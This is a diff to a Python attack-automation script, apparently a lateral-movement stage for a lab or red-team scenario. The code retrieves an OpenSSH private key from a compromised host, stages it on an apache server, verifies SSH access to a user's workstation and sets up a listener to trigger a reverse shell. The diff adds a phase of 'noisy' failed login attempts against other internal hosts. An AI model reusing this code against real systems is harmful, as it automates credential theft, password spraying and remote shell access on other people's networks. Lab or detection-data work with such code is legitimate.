@@ -381,17 +381,17 @@ def run(root_shell, kali_host=KALI_HOST, workstation_ip=None,
     key_end   = raw_key.find("-----END OPENSSH PRIVATE KEY-----")
     if key_start < 0 or key_end < 0:
         log(f"[-] Private key not found at {REMOTE_KEY_PATH}")
-        return None
+        return {"john_shell": None, **_EMPTY_FAILED}
     key_text = raw_key[key_start:key_end + len("-----END OPENSSH PRIVATE KEY-----")] + "\n"
     log("[+] Deploy key retrieved")
 
     # ------------------------------------------------------------------
-    # Phase 2 — Stage key on apache, pre-verify SSH connectivity
+    # Stage key on apache + pre-verify SSH connectivity to john's host
     # ------------------------------------------------------------------
     log(f"[*] Staging key at {STAGED_KEY_PATH} on apache...")
     if not _stage_key_on_apache(root_shell, key_text):
         log("[-] Failed to stage deploy key on apache")
-        return None
+        return {"john_shell": None, **_EMPTY_FAILED}
     log("[+] Key staged successfully")
 
     log(f"[*] Verifying SSH connectivity to {workstation_user}@{workstation_ip}...")
@@ -408,8 +408,19 @@ def run(root_shell, kali_host=KALI_HOST, workstation_ip=None,
     if "uid=" not in verify_out:
         log(f"[-] SSH pre-check failed. Output: {verify_out!r}")
         send_command(root_shell, f"rm -f {STAGED_KEY_PATH}")
-        return None
+        return {"john_shell": None, **_EMPTY_FAILED}
     log(f"[+] SSH pre-check passed: {verify_out.strip()}")
+
+    # ------------------------------------------------------------------
+    # Phase 2 — Noisy failed attempts on non-john internal hosts
+    # ------------------------------------------------------------------
+    spray_targets = [
+        ip for ip in (other_targets if other_targets else _FALLBACK_SPRAY_TARGETS)
+        if ip != workstation_ip and ip not in _SKIP_SPRAY
+    ]
+    if not spray_targets:
+        spray_targets = list(_FALLBACK_SPRAY_TARGETS)
+    failed_result = _failed_attempts(root_shell, spray_targets, workstation_user, workstation_port)
 
     # ------------------------------------------------------------------
     # Phase 3 — Set up listener and trigger reverse shell
@@ -439,7 +450,7 @@ def run(root_shell, kali_host=KALI_HOST, workstation_ip=None,
               f"{workstation_user}@{workstation_ip}")
         send_command(root_shell, f"rm -f {STAGED_KEY_PATH}")
         log(f"[+] Cleaned up {STAGED_KEY_PATH} from apache")
-        return None
+        return {"john_shell": None, **failed_result}
     finally:
         john_server.close()
 
